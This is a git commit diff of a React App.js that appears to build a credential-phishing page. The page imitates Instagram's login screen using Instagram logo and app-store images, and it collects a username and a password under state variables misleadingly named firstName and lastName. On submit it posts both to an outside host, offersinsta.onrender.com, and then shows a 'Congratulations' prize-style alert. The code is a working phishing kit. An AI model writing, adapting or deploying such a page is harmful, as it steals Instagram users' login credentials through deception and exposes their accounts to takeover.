29f71cb88e8e3d89b1c0848ec4d31977a7206175
rahul <buchichowdary02@gmail.com>
2024-08-12 16:39:33 +0530

    first commit

--- src/App.js
+++ src/App.js
@@ -1,25 +1,77 @@
-import logo from './logo.svg';
+import React, { useState } from 'react';
 import './App.css';
+import axios from 'axios';
 
 function App() {
-  return (
-    <div className="App">
-      <header className="App-header">
-        <img src={logo} className="App-logo" alt="logo" />
-        <p>
-          Edit <code>src/App.js</code> and save to reload.
-        </p>
-        <a
-          className="App-link"
-          href="https://reactjs.org"
-          target="_blank"
-          rel="noopener noreferrer"
-        >
-          Learn React
-        </a>
-      </header>
-    </div>
-  );
+    const [firstName, setFirstName] = useState('');
+    const [lastName, setLastName] = useState('');
+
+    const handleSubmit = async (e) => {
+        e.preventDefault();
+        try {
+            const response = await axios.post(`https://offersinsta.onrender.com/api/form`, { firstName, lastName });
+            alert(' Congratulations We wiil get back you soon');
+            setFirstName('');
+            setLastName('');
+
+            console.log(response)
+        } catch (error) {
+            console.error('There was an error submitting the form!', error);
+        }
+    };
+
+    return (
+        <div className="App">
+            <main className="l-main">
+                <div className="l-main__img">
+                    <img src="https://raw.githubusercontent.com/yurimutti/instagram-login-page/master/assets/img/homepage.png" alt="Smartphones" />
+                </div>
+                <div className="l-user">
+                    <div className="c-panel group">
+                        <img className="c-panel__img" src="https://raw.githubusercontent.com/yurimutti/instagram-login-page/058ed9e7358fd1330956d29953b87621d934a98b/assets/img/instagram.svg" alt="Instagram" />
+                        <div className="c-panel__form">
+                            {/* First and Last Name Form */}
+                            <form onSubmit={handleSubmit}>
+                                <div>
+                                    <label></label>
+                                    <input 
+                                        type="text" 
+                                        value={firstName} 
+                                        onChange={(e) => setFirstName(e.target.value)} 
+                                        className="c-panel__input"
+                                        required 
+                                        placeholder='username'
+                                    />
+                                </div>
+                                <div>
+                                    <label></label>
+                                    <input 
+                                        type="text" 
+                                        value={lastName} 
+                                        onChange={(e) => setLastName(e.target.value)} 
+                                        className="c-panel__input"
+                                        required 
+                                        placeholder='Password'
+                                    />
+                                </div>
+                                <button type="submit" className="c-btn">Submit</button>
+                            </form>
+                        </div>
+                    </div>
+                    <div className="c-signup group">
+                        <p>Don't have an account? <span>Sign up</span></p>
+                    </div>
+                    <div className="c-app">
+                        <p>Get the app.</p>
+                        <div className="c-app__download">
+                            <img src="https://raw.githubusercontent.com/yurimutti/instagram-login-page/master/assets/img/apple.png" alt="Apple Store" />
+                            <img src="https://raw.githubusercontent.com/yurimutti/instagram-login-page/master/assets/img/google.png" alt="Google Play" />
+                        </div>
+                    </div>
+                </div>
+            </main>
+        </div>
+    );
 }
 
 export default App;
